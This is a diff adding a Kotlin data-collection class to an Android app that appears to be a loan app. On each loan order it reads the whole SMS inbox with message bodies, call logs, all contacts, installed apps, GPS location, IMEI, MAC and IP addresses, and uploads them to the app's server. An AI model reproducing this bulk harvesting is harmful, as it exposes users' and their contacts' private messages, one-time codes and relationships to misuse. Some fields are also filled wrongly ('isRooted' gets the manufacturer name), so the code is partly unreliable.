@@ -1,0 +1,256 @@
+package com.loan.icreditapp.collect
+
+import android.annotation.SuppressLint
+import android.content.Context
+import android.content.pm.ApplicationInfo
+import android.database.Cursor
+import android.net.Uri
+import android.provider.CallLog
+import android.provider.ContactsContract
+import android.util.Log
+import com.blankj.utilcode.util.*
+import com.blankj.utilcode.util.ThreadUtils.SimpleTask
+import com.loan.icreditapp.BuildConfig
+import com.loan.icreditapp.api.Api
+import com.loan.icreditapp.collect.bean.AppInfoRequest
+import com.loan.icreditapp.collect.bean.ContactRequest
+import com.loan.icreditapp.collect.bean.SmsRequest
+import com.loan.icreditapp.global.AppManager
+import com.loan.icreditapp.global.Constant
+import com.loan.icreditapp.util.BuildRequestJsonUtils
+import com.lzy.okgo.OkGo
+import com.lzy.okgo.callback.StringCallback
+import com.lzy.okgo.model.Response
+import org.json.JSONException
+import org.json.JSONObject
+
+class CollectDataMgr {
+
+    private val TAG = "CollectDataMgr"
+
+    private var mManager: CollectDataMgr? = null
+
+    companion object {
+        val sInstance by lazy(LazyThreadSafetyMode.NONE) {
+            CollectDataMgr()
+        }
+    }
+
+    fun collectAuthData(context: Context, orderId :String , observer: Observer?) {
+        ThreadUtils.executeByCached(object : SimpleTask<Any?>() {
+            @Throws(Throwable::class)
+            override fun doInBackground(): Any {
+                val smsStr = GsonUtils.toJson(readSms(context))
+                val callRecordStr = readCallRecord(context)
+                val contractStr = GsonUtils.toJson(readContract(context))
+                val appInfoStr = GsonUtils.toJson(readAllAppInfo())
+                val locationBean = GsonUtils.toJson(LocationMgr.getInstance().locationBean)
+                val jsonObject = buildRequestJsonObj(smsStr, callRecordStr, contractStr,
+                    appInfoStr, locationBean, orderId)
+                getAuthData(jsonObject, observer)
+                return ""
+            }
+
+            override fun onSuccess(result: Any?) {
+
+            }
+
+        })
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun buildRequestJsonObj(smsStr: String, callRecordStr: String,
+                                    contractStr: String, appListStr: String,
+                                    locationStr: String, orderId: String): JSONObject {
+        val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
+        try {
+            jsonObject.put("accountId", Constant.mAccountId)
+            //申请订单ID
+            jsonObject.put("orderId", orderId)
+            //通讯录json
+            jsonObject.put("contacts", contractStr)
+            //短信记录json
+            jsonObject.put("sms", smsStr)
+            //通话记录json
+            jsonObject.put("call", callRecordStr)
+            //app安装列表json
+            jsonObject.put("appList", appListStr)
+            //GPS位置json
+            jsonObject.put("gps", locationStr)
+            //网络IP
+            jsonObject.put("userIp", NetworkUtils.getIPAddress(true))
+            //公网IP
+            jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
+            //手机IMEI
+            jsonObject.put("imei",  PhoneUtils.getIMEI())
+            //androidId
+            jsonObject.put("androidId",  DeviceUtils.getAndroidID())
+            jsonObject.put("deviceUniqId",  DeviceUtils.getUniqueDeviceId())
+            jsonObject.put("mac",  DeviceUtils.getMacAddress())
+            //手机品牌型号
+            jsonObject.put("brand",  DeviceUtils.getManufacturer())
+            jsonObject.put("innerVersionCode",  DeviceUtils.getManufacturer())
+            jsonObject.put("isRooted",  DeviceUtils.getManufacturer())
+            jsonObject.put("isEmulator",  if (DeviceUtils.isEmulator()) "1" else "0")
+        } catch (e: java.lang.Exception) {
+            e.printStackTrace()
+            if (BuildConfig.DEBUG){
+                throw e
+            }
+        }
+        return jsonObject
+    }
+
+    private fun readSms(context: Context): ArrayList<SmsRequest>? {
+        val list: ArrayList<SmsRequest> = ArrayList<SmsRequest>()
+        val uri = Uri.parse("content://sms/")
+        val projection =
+            arrayOf("_id", "address", "person", "body", "date", "type", "status", "read")
+        val resolver = context.contentResolver
+        val cursor = resolver.query(uri, projection, null, null, null)
+        try {
+            if (cursor != null && cursor.count > 0) {
+                while (cursor.moveToNext()) {
+                    val _id = cursor.getInt(0) //id
+                    val address = cursor.getString(1) //电话号码
+                    val body = cursor.getString(3) //短信内容
+                    val date = cursor.getLong(4)
+                    val type = cursor.getInt(5)
+                    val status = cursor.getInt(6)
+                    val read = cursor.getInt(7)
+                    val smsRequest = SmsRequest()
+                    smsRequest.addr = address
+                    smsRequest.body = body
+                    smsRequest.time = date
+                    smsRequest.type = type
+                    smsRequest.status = status
+                    smsRequest.read = read
+                    //                    public int read;
+//                    public int status;
+                    smsRequest.addr = address
+                    list.add(smsRequest)
+                }
+            }
+        } catch (e: Exception) {
+            if (BuildConfig.DEBUG) {
+                throw e
+            }
+        } finally {
+            cursor?.close()
+        }
+        return list
+    }
+
+    private fun readCallRecord(context: Context): String {
+        val callRecordContent = StringBuffer()
+        val cr = context.contentResolver
+        val uri = CallLog.Calls.CONTENT_URI
+        val projection = arrayOf(
+            CallLog.Calls.NUMBER, CallLog.Calls.DATE,
+            CallLog.Calls.TYPE
+        )
+        var cursor: Cursor? = null
+        try {
+            cursor = cr.query(uri, projection, null, null, null)
+            while (cursor!!.moveToNext()) {
+                val number = cursor.getString(0)
+                val date = cursor.getLong(1)
+                val type = cursor.getInt(2)
+                callRecordContent.append("num ").append(number)
+                    .append("date ").append(date)
+                    .append(type).append(type)
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Log.e(TAG, "read cardCord exception = $e")
+        } finally {
+            cursor?.close()
+        }
+        return callRecordContent.toString()
+    }
+
+    @SuppressLint("Range")
+    private fun readContract(context: Context): ArrayList<ContactRequest>? {
+        //调用并获取联系人信息
+        var cursor: Cursor? = null
+        val list: ArrayList<ContactRequest> = ArrayList<ContactRequest>()
+        try {
+            cursor = context.contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null
+            )
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    val id =
+                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID))
+                    val displayName =
+                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                    val number =
+                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                    val lastUpdateTime =
+                        cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
+                    //                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
+                    val contactRequest = ContactRequest()
+                    contactRequest.name = displayName
+                    contactRequest.number = number
+                    contactRequest.lastUpdate = lastUpdateTime
+                    list.add(contactRequest)
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Log.e(TAG, " exception = $e")
+        } finally {
+            cursor?.close()
+        }
+        return list
+    }
+
+    private fun readAllAppInfo(): ArrayList<AppInfoRequest>? {
+        val list: ArrayList<AppInfoRequest> = ArrayList<AppInfoRequest>()
+        val pm = Utils.getApp().packageManager ?: return list
+        val installedPackages = pm.getInstalledPackages(0)
+            ?: return list
+        for (i in installedPackages.indices) {
+            val packageInfo = installedPackages[i]
+            val appInfoRequest = AppInfoRequest()
+            appInfoRequest.packageName = packageInfo.packageName
+            appInfoRequest.lu = packageInfo.lastUpdateTime
+            appInfoRequest.it = packageInfo.firstInstallTime
+            val ai = packageInfo.applicationInfo
+            if (ai != null) {
+                val isSystem = ApplicationInfo.FLAG_SYSTEM and ai.flags != 0
+                appInfoRequest.type = if (isSystem) 0 else 1
+                try {
+                    appInfoRequest.name = ai.loadLabel(pm).toString()
+                } catch (e: Exception) {
+                }
+            }
+            list.add(appInfoRequest)
+        }
+        return list
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun getAuthData(jsonObject: JSONObject , observer: Observer?) {
+        OkGo.post<String>(Api.UPLOAD_AUTH).tag(TAG).
+        upJson(jsonObject)
+            .execute(object : StringCallback() {
+                override fun onSuccess(response: Response<String>) {
+//                        Log.i(TAG, " response success= " + response.body());
+                    observer?.success(response)
+                }
+
+                override fun onError(response: Response<String>) {
+                    super.onError(response)
+                    //                        Log.i(TAG, "getAuthData response error = ");
+                    observer?.failure(response)
+                }
+            })
+    }
+
+    interface Observer {
+        fun success(response: Response<String>?)
+        fun failure(response: Response<String>?)
+    }
+}
